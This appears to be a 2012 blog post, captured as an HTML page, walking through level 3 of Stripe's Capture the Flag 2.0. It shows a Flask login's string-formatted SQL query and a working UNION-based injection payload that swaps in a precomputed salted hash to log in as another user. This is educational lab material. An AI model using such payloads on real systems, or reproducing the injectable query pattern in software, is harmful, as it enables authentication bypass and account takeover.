@@ -1,0 +1,465 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Stripe Capture The Flag 2.0 - Problem 3 - Reminiscential: of or pertaining to rememberance</title>
+  <meta name="author" content="Kevin Jing Qiu">
+
+  
+  <meta name="description" content="Level 3 Finally we get to level 3. Here&#8217;s the setup: 1
+2
+3
+After the fiasco back in Level 0, management has decided to fortify the Secret Safe &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://kevinjqiu.github.com/2012/09/19/ctf2-dot-0-problem-3/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Reminiscential: of or pertaining to rememberance" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-32737230-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Reminiscential: of or pertaining to rememberance</a></h1>
+  
+    <h2>A blog about nothing and everything</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:kevinjqiu.github.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/about-me">About me</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Stripe Capture the Flag 2.0 - Problem 3</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-09-19T00:01:00-04:00" pubdate data-updated="true">Sep 19<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Level 3</h2>
+
+<p>Finally we get to level 3. Here&#8217;s the setup:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.
+</span><span class='line'>
+</span><span class='line'>A beta version has launched with some interesting secrets (including the password to access Level 4)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here&#8217;s the code for the server (Python finally!)</p>
+
+<div><script src='https://gist.github.com/3747632.js?file='></script>
+<noscript><pre><code>&lt;html&gt;&lt;body&gt;You are being &lt;a href=&quot;https://github.com/gist/3747632&quot;&gt;redirected&lt;/a&gt;.&lt;/body&gt;&lt;/html&gt;</code></pre></noscript></div>
+
+
+<p>&#8230;and here&#8217;s the front-end:</p>
+
+<div><script src='https://gist.github.com/3747637.js?file='></script>
+<noscript><pre><code>&lt;html&gt;&lt;body&gt;You are being &lt;a href=&quot;https://github.com/gist/3747637&quot;&gt;redirected&lt;/a&gt;.&lt;/body&gt;&lt;/html&gt;</code></pre></noscript></div>
+
+
+<p>From the description, we know that we need to break into bob&#8217;s account to retrieve the password to level 4, although breaking into eve and mallory&#8217;s accounts are attempting :) Afterall, who wouldn&#8217;t want to know the proof of <a href="http://en.wikipedia.org/wiki/P_versus_NP_problem">P=NP</a> or how to make a <a href="http://en.wikipedia.org/wiki/Perpetual_motion_machine">perpetual motion machine</a>?</p>
+
+<p>Anyhow, the front-end is a typical login page: you get username and password input fields, and they&#8217;re sent off (via POST) to a server script.
+The server is a simple Flask app that gets the user input, checks them against a table of username and salted password hashes.</p>
+
+<p>The <code>login()</code> function is where all the action takes place. Line 86 quickly caught my eyes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">query</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;SELECT id, password_hash, salt FROM users WHERE username = &#39;{0}&#39; LIMIT 1&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span><span class='line'><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is an alarming pattern of formatting a string and sending it off to <code>cursor.execute()</code>. Python&#8217;s string <code>format()</code> method is just another way of interopolation. It&#8217;s exactly the same as <code>"""SELECT id, password_hash, salt FROM user WHERE username = %s""" % username"""</code>.</p>
+
+<p>Now that we found the vulnerability, we need to find a way exploit it.</p>
+
+<h3>Take 1</h3>
+
+<p>Normally, with SQL injection, you craft an input to terminate the previous statement, and inject the statement you want it to execute. Reading the code, it&#8217;s getting the user&#8217;s password hash and salt for the given user, and check it against the input hash and salt. The hashing method is <a href="http://en.wikipedia.org/wiki/SHA-2">sha256</a>. With Python, we can quickly pre-calculate a salted hash to inject. Here&#8217;s an example, with password <code>1</code> and salt <code>a</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>python -c <span class="s2">&quot;import hashlib; print hashlib.sha256(&#39;1&#39;+&#39;a&#39;).hexdigest()&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and we get <code>a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65</code>.</p>
+
+<p>The statement we really want it to execute is:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="s1">&#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;bob&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>so when we put &#8216;1&#8217; in the password input box, we will get the server to run sha246 on &#8216;1&#8217; + &#8216;a&#8217;, and check it against the hash that we fed in. The entire query gets executed wil look like this (with the middle line being the <code>username</code> we feed in):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">,</span> <span class="n">salt</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">&#39;</span><span class="p">;</span> <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span>  <span class="s1">&#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;bob</span>
+</span><span class='line'><span class="s1">&#39;</span> <span class="k">LIMIT</span> <span class="mi">1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>How does that faire?</p>
+
+<p>Unfortunately, we get a stack trace in the traceback:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="k">call</span> <span class="k">last</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1689</span><span class="p">,</span> <span class="k">in</span> <span class="n">wsgi_app</span>
+</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">make_response</span><span class="p">(</span><span class="k">self</span><span class="p">.</span><span class="n">handle_exception</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1687</span><span class="p">,</span> <span class="k">in</span> <span class="n">wsgi_app</span>
+</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">full_dispatch_request</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1360</span><span class="p">,</span> <span class="k">in</span> <span class="n">full_dispatch_request</span>
+</span><span class='line'>    <span class="n">rv</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">handle_user_exception</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1358</span><span class="p">,</span> <span class="k">in</span> <span class="n">full_dispatch_request</span>
+</span><span class='line'>    <span class="n">rv</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">dispatch_request</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1344</span><span class="p">,</span> <span class="k">in</span> <span class="n">dispatch_request</span>
+</span><span class='line'>    <span class="k">return</span> <span class="k">self</span><span class="p">.</span><span class="n">view_functions</span><span class="p">[</span><span class="k">rule</span><span class="p">.</span><span class="n">endpoint</span><span class="p">](</span><span class="o">**</span><span class="n">req</span><span class="p">.</span><span class="n">view_args</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Users/kevin/src/ctf/level03-code/secretvault.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">91</span><span class="p">,</span> <span class="k">in</span> <span class="n">login</span>
+</span><span class='line'>    <span class="k">cursor</span><span class="p">.</span><span class="k">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="n">Warning</span><span class="p">:</span> <span class="n">You</span> <span class="n">can</span> <span class="k">only</span> <span class="k">execute</span> <span class="n">one</span> <span class="k">statement</span> <span class="k">at</span> <span class="n">a</span> <span class="n">time</span><span class="p">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>cursor</code> cannot run more than one statement at a time! Smart, eh?</p>
+
+<h3>Take 2</h3>
+
+<p>So the trick here is to use exactly 1 statement to inject our crafted data. We still want this to be returning the same fields. What if I <code>UNION</code> two queries, with the second query selecting the injected data?</p>
+
+<p>So something like this (the middle line is the one we inject as <code>username</code>):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">,</span> <span class="n">salt</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">bob&#39;</span> <span class="k">UNION</span> <span class="k">select</span> <span class="n">id</span><span class="p">,</span> <span class="s1">&#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;bob</span>
+</span><span class='line'><span class="s1">&#39;</span> <span class="k">LIMIT</span> <span class="mi">1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Submit, and boom:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Welcome</span> <span class="n">back</span><span class="o">!</span> <span class="n">Your</span> <span class="n">secret</span> <span class="k">is</span><span class="p">:</span> <span class="ss">&quot;...&quot;</span> <span class="p">(</span><span class="n">Log</span> <span class="k">out</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Conclusion</h2>
+
+<p>This is a canonical SQL injection. Again, NEVER trust user input. Always sanitize user input.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Kevin Jing Qiu</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-09-19T00:01:00-04:00" pubdate data-updated="true">Sep 19<span>th</span>, 2012</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://kevinjqiu.github.com/2012/09/19/ctf2-dot-0-problem-3/" data-via="kevinjqiu" data-counturl="http://kevinjqiu.github.com/2012/09/19/ctf2-dot-0-problem-3/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2012/09/12/ctf2-dot-0-problem-2/" title="Previous Post: Stripe Capture The Flag 2.0 - Problem 2">&laquo; Stripe Capture The Flag 2.0 - Problem 2</a>
+      
+      
+        <a class="basic-alignment right" href="/2013/11/20/first-dip-into-golangs-concurrency/" title="Next Post: First dip into Golang's concurrency">First dip into Golang's concurrency &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+<h1><a href="/about-me">About Me</a></h1>
+I'm a software developer living in Toronto, Ontario.  <a href="http://ca.linkedin.com/in/kevinjqiu"><img src="http://www.linkedin.com/img/webpromo/btn_viewmy_160x25.png" width="160" height="25" border="0" alt="View Kevin Jing Qiu's profile on LinkedIn"></a>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2013/11/20/first-dip-into-golangs-concurrency/">First dip into Golang's concurrency</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2012/09/19/ctf2-dot-0-problem-3/">Stripe Capture The Flag 2.0 - Problem 3</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2012/09/12/ctf2-dot-0-problem-2/">Stripe Capture The Flag 2.0 - Problem 2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2012/09/10/ctf2-dot-0-problem-1/">Stripe Capture The Flag 2.0 - Problem 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2012/09/09/ctf2-dot-0-problem-0/">Stripe Capture The Flag 2.0 - Problem 0</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/kevinjqiu">@kevinjqiu</a> on GitHub
+  
+  <script type="text/javascript">
+    $.domReady(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'kevinjqiu',
+            count: 0,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("kevinjqiu", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/kevinjqiu" class="twitter-follow-button" data-show-count="false">Follow @kevinjqiu</a>
+  
+</section>
+
+
+<section class="googleplus">
+  <h1>
+    <a href="https://plus.google.com/kevin.jing.qiu@gmail.com?rel=author">
+      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
+      Google+
+    </a>
+  </h1>
+</section>
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - Kevin Jing Qiu -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'reminiscential';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://kevinjqiu.github.com/2012/09/19/ctf2-dot-0-problem-3/';
+        var disqus_url = 'http://kevinjqiu.github.com/2012/09/19/ctf2-dot-0-problem-3/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
